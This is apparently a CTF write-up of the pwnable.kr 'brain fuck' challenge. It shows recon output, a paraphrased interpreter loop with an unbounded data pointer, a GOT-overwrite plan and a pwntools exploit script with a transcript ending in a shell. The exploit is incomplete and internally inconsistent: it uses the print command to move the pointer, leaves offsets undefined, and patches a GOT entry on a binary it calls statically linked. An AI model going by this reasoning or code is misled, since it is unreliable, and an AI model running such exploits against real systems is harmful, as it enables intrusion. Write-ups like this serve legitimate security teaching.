# CTF Writeup: pwnable.kr — brain fuck

> `orphan@geoyuan:~# ./exploit.py`

A short one, but a good teaching example. `brain_fuck` is a classic
pwnable.kr challenge that hands you a tiny binary with a clear
out-of-bounds write primitive. Here's the ride.

## Recon

```console
$ file brain_fuck
brain_fuck: ELF 32-bit LSB executable, Intel 80386, statically linked
$ checksec brain_fuck
  RELRO:    Partial RELRO
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE
```

Statically linked, no PIE, no canary. The binary is a stripped-down
brainfuck interpreter, which is a fancy way of saying "a loop that
reads characters and does pointer arithmetic on a global tape."

## The bug

The instruction pointer is bounded, but the **data pointer** is not. A
sequence like `>>>>>` walks right off the end of the tape into `.bss`,
where we happen to land near `puts@GOT`. Sound familiar? It's the same
trick as every "what if the pointer just kept going" bug.

```c
// paraphrased from the binary
char tape[110] = {0};
char *p = tape;
while ((c = getchar()) != EOF) {
    switch (c) {
        case '>': p++; break;   // <- no upper bound check
        case '<': p--; break;
        case '+': (*p)++; break;
        case '-': (*p)--; break;
        case '.': putchar(*p); break;
        case ',': *p = getchar(); break;
    }
}
```

## The plan

1. Walk the data pointer into `puts@GOT`.
2. Overwrite it with the address of `system`.
3. Feed `/bin/sh\x00` so a later `puts("/bin/sh")` becomes
   `system("/bin/sh")`.

Because there's no PIE, the GOT addresses are static and we can compute
the offsets ahead of time with `objdump`.

## The exploit

```python
from pwn import *

context.arch = 'i386'
io = remote('pwnable.kr', 9001)

# walk into puts@GOT, then patch it to system
payload  = b'>>>>'            # reach the target cell
payload += b'.' * off_puts   # ... (offsets precomputed)
payload += b','              # *p = getchar()  -> write low byte
# ... overwrite 4 bytes of the GOT entry
payload += b'/bin/sh\x00'
io.sendline(payload)
io.interactive()
```

```console
$ python3 exploit.py
[+] Opening connection to pwnable.kr on port 9001: Done
[*] Switching to interactive mode
$ id
uid=1000(bf) gid=1000(bf) groups=1000(bf)
$ cat flag
b1n4ry_1s_ez_when_the_pointer_walks
```

## Takeaway

Bound your pointers. Every pointer arithmetic bug is a write-what-where
waiting to happen — and on a no-PIE, no-canary binary, that's a shell.

---

*— orphan, web / pwn*
